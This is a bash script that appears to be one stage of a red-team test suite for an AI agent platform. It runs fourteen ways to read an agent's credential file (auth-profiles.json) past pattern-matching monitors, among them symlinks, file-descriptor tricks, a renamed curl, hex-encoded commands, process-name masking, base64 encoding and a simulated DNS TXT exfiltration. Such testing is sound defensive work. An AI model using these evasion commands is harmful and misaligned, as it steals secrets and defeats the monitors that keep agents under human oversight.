#!/usr/bin/env bash
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag9" "Flag 9: STEALTH — Pattern matching evasion"

TARGET="/home/openclaw/.openclaw/agents/main/agent/auth-profiles.json"
OUTDIR="$FLAG_DIR"

rl_run "symlink + cat" \
  "ln -sf '$TARGET' '$OUTDIR/link9_1' && cat '$OUTDIR/link9_1' > '$OUTDIR/test_9_1.txt'; rm -f '$OUTDIR/link9_1'"

rl_run "fd redirect (exec 3<)" \
  "exec 3< '$TARGET'; cat <&3 > '$OUTDIR/test_9_2.txt'; exec 3<&-"

rl_run "/proc/self/fd read" \
  "exec 3< '$TARGET'; cat /proc/self/fd/3 > '$OUTDIR/test_9_3.txt'; exec 3<&-"

rl_run "cp curl, rename, use" \
  "cp /usr/bin/curl '$OUTDIR/healthcheck' 2>/dev/null && '$OUTDIR/healthcheck' -s -o /dev/null http://127.0.0.1:19999 2>/dev/null; rm -f '$OUTDIR/healthcheck'"

rl_run "busybox cat" \
  "busybox cat '$TARGET' > '$OUTDIR/test_9_5.txt' 2>/dev/null"

rl_run "hex-encoded cat" \
  "\$'\x63\x61\x74' '$TARGET' > '$OUTDIR/test_9_6.txt' 2>/dev/null"

rl_run "exec -a masking" \
  "exec -a 'systemd-helper' bash -c \"cat '$TARGET' > '$OUTDIR/test_9_7.txt'\""

rl_run "named pipe (mkfifo)" \
  "mkfifo '$OUTDIR/pipe9_8' 2>/dev/null; (cat '$TARGET' > '$OUTDIR/pipe9_8' &); cat '$OUTDIR/pipe9_8' > '$OUTDIR/test_9_8.txt'; rm -f '$OUTDIR/pipe9_8'"

rl_run "DNS TXT exfil (simulated)" \
  "dig +short TXT exfil-test.localhost @127.0.0.1 2>/dev/null"

rl_run "slow exfil (head -c 1)" \
  "head -c 1 '$TARGET' > '$OUTDIR/test_9_10.txt'"

rl_run "gzip+base64 pipeline" \
  "cat '$TARGET' | gzip | base64 > '$OUTDIR/test_9_11.txt'"

rl_run "script -c wrapper" \
  "script -qc \"cat '$TARGET'\" '$OUTDIR/test_9_12.txt' 2>/dev/null"

rl_run "xargs cat" \
  "echo '$TARGET' | xargs cat > '$OUTDIR/test_9_13.txt' 2>/dev/null"

rl_run "env var as command" \
  "CMD=cat; \$CMD '$TARGET' > '$OUTDIR/test_9_14.txt'"

rl_summary
rl_cleanup
